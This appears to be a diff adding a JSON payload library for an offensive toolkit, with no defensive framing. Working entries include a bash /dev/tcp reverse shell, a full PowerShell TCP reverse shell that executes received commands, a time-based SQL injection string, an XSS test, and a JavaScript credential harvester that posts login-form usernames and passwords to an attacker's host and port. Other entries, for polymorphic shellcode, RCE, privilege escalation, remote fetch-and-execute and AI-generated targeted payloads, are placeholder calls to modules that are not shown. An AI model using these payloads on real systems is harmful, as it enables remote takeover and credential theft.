@@ -1,0 +1,58 @@
+{
+    "basic_payloads": [
+        {
+            "name": "reverse_shell_bash",
+            "code": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
+            "description": "Bash reverse shell payload for Unix systems."
+        },
+        {
+            "name": "reverse_shell_powershell",
+            "code": "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+            "description": "PowerShell reverse shell payload for Windows systems."
+        },
+        {
+            "name": "sql_injection_time_based",
+            "code": "' OR SLEEP({delay})--",
+            "description": "Time-based SQL injection payload to test for blind SQL injection vulnerabilities."
+        },
+        {
+            "name": "xss_basic_script",
+            "code": "<script>alert('XSS');</script>",
+            "description": "Basic Cross-Site Scripting (XSS) payload."
+        }
+    ],
+    "advanced_payloads": [
+        {
+            "name": "polymorphic_shellcode",
+            "code": "polymorphic_code_gen.generate_shellcode()",
+            "description": "Polymorphic shellcode generated at runtime to evade signature-based detection."
+        },
+        {
+            "name": "credential_harvester",
+            "code": "javascript:(function(){var url='http://{host}:{port}/';var creds='u='+encodeURIComponent(document.getElementById('username').value)+'&p='+encodeURIComponent(document.getElementById('password').value);var xhr=new XMLHttpRequest();xhr.open('POST',url,true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send(creds);})()",
+            "description": "JavaScript payload to harvest credentials from a login form."
+        },
+        {
+            "name": "remote_code_execution",
+            "code": "rce_exploit.execute_remote_code('{target}', '{code_to_execute}')",
+            "description": "Remote Code Execution (RCE) payload to execute arbitrary code on the target system."
+        },
+        {
+            "name": "privilege_escalation",
+            "code": "privilege_escalation.execute('{current_user}')",
+            "description": "Payload to escalate privileges on the target system."
+        }
+    ],
+    "dynamic_payloads": [
+        {
+            "name": "dynamic_code_execution",
+            "code": "exec(dynamic_code_exec.fetch_and_execute('{api_endpoint}', '{api_key}'))",
+            "description": "Dynamic code execution payload that fetches and executes code from a remote API."
+        },
+        {
+            "name": "ai_assisted_payload",
+            "code": "ai_integration.generate_targeted_payload('{target_attributes}')",
+            "description": "AI-assisted payload generation based on target attributes and vulnerabilities."
+        }
+    ]
+}
